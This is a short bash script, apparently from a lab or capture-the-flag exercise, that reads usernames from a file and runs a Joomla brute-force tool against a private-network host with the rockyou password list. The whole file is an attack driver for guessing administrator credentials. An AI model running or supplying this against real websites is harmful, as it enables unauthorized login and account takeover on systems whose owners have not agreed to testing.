#!/bin/bash
while read i; do
     echo -e "Testing "${i}
     python3 joomla-brute.py -u http://172.16.10.100 -w rockyou.txt -usr ${i}
done<user.txt
